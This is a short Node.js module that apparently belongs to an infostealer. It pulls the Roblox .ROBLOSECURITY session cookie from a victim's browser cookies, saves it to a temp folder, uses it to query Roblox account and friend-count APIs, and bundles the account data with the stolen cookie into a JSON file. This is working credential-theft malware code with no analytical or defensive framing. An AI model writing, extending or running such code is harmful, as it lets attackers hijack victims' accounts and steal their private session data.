const { join } = require('path');
const fs = require('fs');
const { tempFolder } = require('../index');
const { searchForFile } = require('../util/dir');
const axios = require('axios');
const { writeFileSync } = require('fs');
const { getCookies } = require('../util/cookies');

module.exports = async () => {
  const cookies = await getCookies();
  const cookieValue = cookies.find(cookie => cookie.host.includes('.roblox.com') && cookie.name === '.ROBLOSECURITY');
  if (!cookieValue) return;
  const { value: cookie, source } = cookieValue;
  fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);

  const file = await searchForFile(join(tempFolder, 'Roblox Cookie.txt'), 1000, 10);
  if (!file || file.trim() === '') return;
  const jsonFile = join(tempFolder, 'Roblox.json');
  const config = {
    headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') }
  };
  const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', config);
  const friendsCount = await axios.get('https://friends.roblox.com/v1/my/friends/count', config) || undefined;
  account.data.source = source;
  account.data.cookie = file.replaceAll('"', '');
  account.data.friendsCount = friendsCount.data.count;
  writeFileSync(jsonFile, JSON.stringify(account.data));
};
